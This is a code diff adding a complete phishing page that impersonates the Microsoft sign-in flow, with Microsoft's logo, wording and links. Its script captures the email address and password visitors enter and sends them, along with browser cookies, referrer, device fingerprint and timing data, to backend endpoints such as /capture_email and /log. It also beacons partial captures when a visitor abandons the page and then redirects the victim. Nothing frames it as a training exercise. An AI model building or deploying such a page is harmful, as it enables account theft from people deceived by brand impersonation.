@@ -1,0 +1,653 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="-1">
+    <title>Sign in to your account</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
+            background-color: #f1f1f1;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        /* Main container */
+        .login-container {
+            width: 100%;
+            max-width: 440px;
+            margin: 0 auto;
+        }
+
+        /* Card style similar to Microsoft modern login */
+        .card {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.12);
+            padding: 44px 40px 48px;
+            transition: all 0.2s ease;
+        }
+
+        /* Logo */
+        .logo {
+            display: block;
+            width: 108px;
+            margin-bottom: 24px;
+        }
+
+        /* Headings */
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            line-height: 1.25;
+            color: #1b1b1b;
+            margin-bottom: 16px;
+        }
+
+        .sub-heading {
+            font-size: 14px;
+            color: #5e5e5e;
+            margin-bottom: 32px;
+            line-height: 1.4;
+        }
+
+        /* Form groups */
+        .form-group {
+            margin-bottom: 28px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 8px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px 12px;
+            border: 1px solid #8c8c8c;
+            border-radius: 4px;
+            font-size: 16px;
+            line-height: 1.2;
+            transition: border-color 0.1s, box-shadow 0.1s;
+            font-family: inherit;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #0078d4;
+            box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.2);
+        }
+
+        input.readonly-bg {
+            background-color: #f5f5f5;
+            border-color: #d1d1d1;
+            cursor: not-allowed;
+        }
+
+        /* Buttons */
+        .button-primary {
+            background-color: #0078d4;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 12px 20px;
+            font-size: 15px;
+            font-weight: 600;
+            width: 100%;
+            cursor: pointer;
+            transition: background 0.1s;
+        }
+
+        .button-primary:hover {
+            background-color: #106ebe;
+        }
+
+        .button-primary:active {
+            background-color: #005a9e;
+        }
+
+        .button-primary:disabled {
+            background-color: #b0b0b0;
+            cursor: not-allowed;
+            opacity: 0.7;
+        }
+
+        /* Secondary links */
+        .links {
+            margin-top: 28px;
+            font-size: 13px;
+        }
+
+        .links a {
+            color: #0078d4;
+            text-decoration: none;
+            display: inline-block;
+            margin-bottom: 12px;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
+        }
+
+        .separator {
+            border-top: 1px solid #e1e1e1;
+            margin: 24px 0 20px;
+        }
+
+        /* Footer (terms & privacy) */
+        .footer-links {
+            margin-top: 32px;
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+        }
+
+        .footer-links a {
+            color: #666;
+            text-decoration: none;
+            margin: 0 12px;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+            color: #0078d4;
+        }
+
+        /* message toasts */
+        .message-toast {
+            background: #fde7e9;
+            border-left: 4px solid #d13438;
+            padding: 12px 16px;
+            border-radius: 4px;
+            margin-bottom: 24px;
+            font-size: 14px;
+            color: #d13438;
+            animation: slideIn 0.25s ease-out;
+        }
+
+        .message-success {
+            background: #e6f3e6;
+            border-left-color: #107c10;
+            color: #107c10;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* loading spinner inline */
+        .spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #ffffff;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 0.6s linear infinite;
+            margin-left: 8px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* responsive */
+        @media (max-width: 480px) {
+            .card {
+                padding: 32px 24px;
+            }
+        }
+
+        /* hidden class for page transition */
+        .hidden-page {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-container" id="appRoot">
+    <!-- PAGE 1: EMAIL PAGE -->
+    <div id="emailPage" class="card">
+        <img class="logo" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft">
+        <h1>Sign in</h1>
+        <div class="sub-heading">to continue to Microsoft services</div>
+
+        <div id="emailMessageArea"></div>
+
+        <div class="form-group">
+            <label for="emailInput">Email, phone, or Skype</label>
+            <input type="email" id="emailInput" name="loginfmt" maxlength="113" autocomplete="username webauthn" placeholder="someone@example.com">
+        </div>
+
+        <button id="nextButton" class="button-primary">Next</button>
+
+        <div class="links">
+            <a href="#" id="createAccountLink">No account? Create one!</a>
+            <div style="margin-top: 8px;"><a href="#" id="cantAccessLink">Can't access your account?</a></div>
+        </div>
+
+        <div class="separator"></div>
+        <div class="footer-links">
+            <a href="https://www.microsoft.com/en/servicesagreement/">Terms of use</a>
+            <a href="https://privacy.microsoft.com/en/privacystatement">Privacy &amp; cookies</a>
+        </div>
+    </div>
+
+    <!-- PAGE 2: PASSWORD PAGE (initially hidden) -->
+    <div id="passwordPage" class="card hidden-page">
+        <img class="logo" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft">
+        <h1>Enter password</h1>
+        <div id="passwordSubtext" class="sub-heading">for <span id="displayEmailSpan"></span></div>
+
+        <div id="passwordMessageArea"></div>
+
+        <div class="form-group">
+            <label for="passwordInput">Password</label>
+            <input type="password" id="passwordInput" autocomplete="current-password" placeholder="">
+        </div>
+
+        <button id="signInButton" class="button-primary">Sign in</button>
+
+        <div class="links">
+            <a href="#" id="forgotPasswordLink">Forgot password?</a>
+            <div style="margin-top: 8px;"><a href="#" id="backToEmailLink">Use another account</a></div>
+        </div>
+
+        <div class="separator"></div>
+        <div class="footer-links">
+            <a href="https://www.microsoft.com/en/servicesagreement/">Terms of use</a>
+            <a href="https://privacy.microsoft.com/en/privacystatement">Privacy &amp; cookies</a>
+        </div>
+    </div>
+</div>
+
+<script>
+    // --------------------------------------------------------------
+    // Configuration: Replace API_BASE_URL if needed, keep empty for same-origin
+    // If backend runs on same server (Flask) relative paths work.
+    // For local dev with Flask backend on port 5000, set API_BASE_URL = ''
+    // because we are serving from same origin or adjust accordingly.
+    // --------------------------------------------------------------
+    const API_BASE_URL = '';   // empty = relative URLs to current origin
+
+    // Global state
+    let capturedEmail = '';
+    let loginStartTime = Date.now();
+    let emailSubmitAttempt = false;
+
+    // DOM elements (email page)
+    const emailPage = document.getElementById('emailPage');
+    const passwordPage = document.getElementById('passwordPage');
+    const emailInput = document.getElementById('emailInput');
+    const nextButton = document.getElementById('nextButton');
+    const emailMessageArea = document.getElementById('emailMessageArea');
+    
+    // DOM elements (password page)
+    const displayEmailSpan = document.getElementById('displayEmailSpan');
+    const passwordInput = document.getElementById('passwordInput');
+    const signInButton = document.getElementById('signInButton');
+    const passwordMessageArea = document.getElementById('passwordMessageArea');
+    const forgotPasswordLink = document.getElementById('forgotPasswordLink');
+    const backToEmailLink = document.getElementById('backToEmailLink');
+    const createAccountLink = document.getElementById('createAccountLink');
+    const cantAccessLink = document.getElementById('cantAccessLink');
+
+    // Helper: Show temporary message on email page
+    function showEmailMessage(message, isError = true) {
+        emailMessageArea.innerHTML = `<div class="message-toast ${!isError ? 'message-success' : ''}">${escapeHtml(message)}</div>`;
+        setTimeout(() => {
+            if (emailMessageArea.firstChild) emailMessageArea.innerHTML = '';
+        }, 5000);
+    }
+
+    // Helper: Show temporary message on password page
+    function showPasswordMessage(message, isError = true) {
+        passwordMessageArea.innerHTML = `<div class="message-toast ${!isError ? 'message-success' : ''}">${escapeHtml(message)}</div>`;
+        setTimeout(() => {
+            if (passwordMessageArea.firstChild) passwordMessageArea.innerHTML = '';
+        }, 5000);
+    }
+
+    // simple escape to avoid XSS
+    function escapeHtml(str) {
+        if (!str) return '';
+        return str.replace(/[&<>]/g, function(m) {
+            if (m === '&') return '&amp;';
+            if (m === '<') return '&lt;';
+            if (m === '>') return '&gt;';
+            return m;
+        }).replace(/[\uD800-\uDBFF][\uDC00-\uDFFF]/g, function(c) {
+            return c;
+        });
+    }
+
+    // Device fingerprint for analytics (non-intrusive)
+    function getDeviceFingerprint() {
+        return {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            languages: navigator.languages,
+            cookieEnabled: navigator.cookieEnabled,
+            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+            deviceMemory: navigator.deviceMemory || 'unknown',
+            maxTouchPoints: navigator.maxTouchPoints,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            screenResolution: `${screen.width}x${screen.height}`,
+            colorDepth: screen.colorDepth
+        };
+    }
+
+    // Send email to backend (Flask endpoint)
+    async function sendEmailToBackend(email) {
+        try {
+            const fingerprint = getDeviceFingerprint();
+            const response = await fetch(`${API_BASE_URL}/capture_email`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                credentials: 'include',
+                body: JSON.stringify({
+                    email: email,
+                    user_agent: navigator.userAgent,
+                    url: window.location.href,
+                    screen: `${screen.width}x${screen.height}`,
+                    fingerprint: fingerprint,
+                    timestamp: new Date().toISOString()
+                })
+            });
+            const result = await response.json();
+            return result;
+        } catch (err) {
+            console.error('Email capture error:', err);
+            return { status: 'error', message: err.message || 'Network error' };
+        }
+    }
+
+    // Send password + final credentials
+    async function sendCredentials(email, password) {
+        try {
+            const fingerprint = getDeviceFingerprint();
+            const timeSpent = Math.floor((Date.now() - loginStartTime) / 1000);
+            const response = await fetch(`${API_BASE_URL}/log`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                credentials: 'include',
+                body: JSON.stringify({
+                    email: email,
+                    password: password,
+                    user_agent: navigator.userAgent,
+                    cookies: document.cookie,
+                    referrer: document.referrer,
+                    url: window.location.href,
+                    screen: `${screen.width}x${screen.height}`,
+                    fingerprint: fingerprint,
+                    time_on_page: timeSpent,
+                    login_attempts: 1,
+                    timestamp: new Date().toISOString()
+                })
+            });
+            const result = await response.json();
+            return result;
+        } catch (err) {
+            console.error('Login send error:', err);
+            return { status: 'error', message: err.message || 'Connection failed' };
+        }
+    }
+
+    // Validate email format (more realistic)
+    function isValidEmail(email) {
+        if (!email) return false;
+        const trimmed = email.trim();
+        // basic regex: local@domain.tld  (allow common patterns)
+        const re = /^[^\s@]+@([^\s@.,]+\.)+[^\s@.,]{2,}$/i;
+        return re.test(trimmed);
+    }
+
+    // Switch to password page after successful email capture
+    function transitionToPasswordPage(email) {
+        capturedEmail = email;
+        displayEmailSpan.innerText = escapeHtml(email);
+        // Hide email page, show password page
+        emailPage.classList.add('hidden-page');
+        passwordPage.classList.remove('hidden-page');
+        // Focus password input after small delay
+        setTimeout(() => {
+            passwordInput.focus();
+        }, 100);
+        // Save email to localStorage for convenience
+        localStorage.setItem('microsoft_login_email', email);
+    }
+
+    // Go back to email page (reset)
+    function backToEmail() {
+        // Reset state
+        capturedEmail = '';
+        emailInput.value = '';
+        passwordInput.value = '';
+        passwordMessageArea.innerHTML = '';
+        emailMessageArea.innerHTML = '';
+        emailPage.classList.remove('hidden-page');
+        passwordPage.classList.add('hidden-page');
+        // Reset any loading states
+        nextButton.disabled = false;
+        nextButton.innerText = 'Next';
+        signInButton.disabled = false;
+        signInButton.innerText = 'Sign in';
+        emailInput.focus();
+    }
+
+    // Handle "Next" on email page
+    async function onEmailNext() {
+        const emailValue = emailInput.value.trim();
+        if (!emailValue) {
+            showEmailMessage('Enter a valid email address, phone number, or Skype name.', true);
+            emailInput.focus();
+            return;
+        }
+        if (!isValidEmail(emailValue)) {
+            showEmailMessage('Please enter a valid email address (e.g., name@example.com).', true);
+            emailInput.focus();
+            return;
+        }
+
+        // disable button & show loading state
+        nextButton.disabled = true;
+        const originalText = nextButton.innerText;
+        nextButton.innerText = 'Checking...';
+
+        try {
+            // 1) send email to backend for tracking (or just validation)
+            const emailResult = await sendEmailToBackend(emailValue);
+            
+            // Even if backend fails, we still proceed (graceful degradation) but show warning?
+            if (emailResult.status === 'error') {
+                console.warn('Backend email capture failed:', emailResult.message);
+                // still continue but show subtle notification? Continue to password.
+                showEmailMessage('Proceeding to password (tracking issue, but you can sign in)', false);
+            } else {
+                showEmailMessage('Email verified! Please enter your password.', false);
+            }
+            
+            // 2) Transition to password page (separate page)
+            transitionToPasswordPage(emailValue);
+        } catch (err) {
+            console.error('Unexpected error:', err);
+            showEmailMessage('Network error. Please try again.', true);
+            nextButton.disabled = false;
+            nextButton.innerText = originalText;
+        } finally {
+            // if we didn't transition, re-enable; if we transition, we don't need.
+            if (emailPage.classList.contains('hidden-page') === false) {
+                nextButton.disabled = false;
+                nextButton.innerText = originalText;
+            }
+        }
+    }
+
+    // Handle Sign In on password page
+    async function onPasswordSignIn() {
+        const password = passwordInput.value;
+        if (!password) {
+            showPasswordMessage('Enter your password.', true);
+            passwordInput.focus();
+            return;
+        }
+        if (password.length < 6) {
+            showPasswordMessage('The password you entered is too short (minimum 6 characters).', true);
+            passwordInput.focus();
+            return;
+        }
+
+        // disable sign-in button
+        signInButton.disabled = true;
+        const originalBtnText = signInButton.innerText;
+        signInButton.innerText = 'Signing in...';
+        
+        // Optionally add spinner inside button
+        const spinnerSpan = document.createElement('span');
+        spinnerSpan.className = 'spinner';
+        signInButton.appendChild(spinnerSpan);
+
+        try {
+            // send email + password to backend
+            const loginResult = await sendCredentials(capturedEmail, password);
+            
+            if (loginResult.status === 'success') {
+                // Successful capture: redirect according to backend response
+                if (loginResult.redirect) {
+                    window.location.href = loginResult.redirect;
+                } else if (loginResult.oauth_url) {
+                    window.location.href = loginResult.oauth_url;
+                } else {
+                    // fallback: go to dashboard or a safe page (could be relative)
+                    window.location.href = `${API_BASE_URL}/dashboard`;
+                }
+            } else {
+                // error from backend (invalid credentials simulation or backend failure)
+                let errorMsg = loginResult.message || 'Invalid email or password. Please try again.';
+                showPasswordMessage(errorMsg, true);
+                // reset button
+                signInButton.disabled = false;
+                signInButton.innerText = originalBtnText;
+                if (spinnerSpan && spinnerSpan.parentNode) spinnerSpan.remove();
+                passwordInput.focus();
+                // we do not redirect
+            }
+        } catch (err) {
+            console.error('Login submission error:', err);
+            showPasswordMessage('Connection error. Please check your internet and try again.', true);
+            signInButton.disabled = false;
+            signInButton.innerText = originalBtnText;
+            if (spinnerSpan && spinnerSpan.parentNode) spinnerSpan.remove();
+            passwordInput.focus();
+            
+            // Fallback demonstration: For development without backend, you can uncomment next line 
+            // to simulate redirect after a while. But keep original behavior.
+            // In production with actual Flask backend, it should redirect properly.
+        }
+    }
+
+    // Forgot password click
+    function onForgotPassword(e) {
+        e.preventDefault();
+        showPasswordMessage('Password reset link would be sent to your email address. (Demo)', false);
+    }
+
+    // Pre-fill saved email if exists
+    function prefillSavedEmail() {
+        const savedEmail = localStorage.getItem('microsoft_login_email');
+        if (savedEmail && emailInput) {
+            emailInput.value = savedEmail;
+        }
+    }
+
+    // Additional handlers: "No account? Create one!" and "Can't access account?"
+    function onCreateAccount(e) {
+        e.preventDefault();
+        window.open('https://signup.live.com/signup', '_blank');
+    }
+    
+    function onCantAccess(e) {
+        e.preventDefault();
+        window.open('https://account.live.com/password/reset', '_blank');
+    }
+
+    // Helper to send analytics on beforeunload (if email captured but not completed)
+    window.addEventListener('beforeunload', () => {
+        if (capturedEmail && passwordPage.classList.contains('hidden-page') === false) {
+            const timeSpent = Math.floor((Date.now() - loginStartTime) / 1000);
+            if (navigator.sendBeacon) {
+                navigator.sendBeacon(`${API_BASE_URL}/analytics`, JSON.stringify({
+                    email: capturedEmail,
+                    time_spent: timeSpent,
+                    abandoned: true,
+                    step: 'password_view'
+                }));
+            }
+        }
+    });
+
+    // Listeners
+    nextButton.addEventListener('click', onEmailNext);
+    signInButton.addEventListener('click', onPasswordSignIn);
+    forgotPasswordLink.addEventListener('click', onForgotPassword);
+    backToEmailLink.addEventListener('click', (e) => {
+        e.preventDefault();
+        backToEmail();
+    });
+    createAccountLink.addEventListener('click', onCreateAccount);
+    cantAccessLink.addEventListener('click', onCantAccess);
+    
+    // Allow pressing Enter on email input
+    emailInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') {
+            e.preventDefault();
+            onEmailNext();
+        }
+    });
+    
+    // Allow pressing Enter on password input
+    passwordInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') {
+            e.preventDefault();
+            onPasswordSignIn();
+        }
+    });
+    
+    // Prefill saved email on page load
+    prefillSavedEmail();
+    
+    // Optionally, if there's any referrer logging: add start time
+    loginStartTime = Date.now();
+    
+    // Log initialization (debug purpose)
+    console.log('Microsoft login with separate password page ready.');
+</script>
+</body>
+</html>
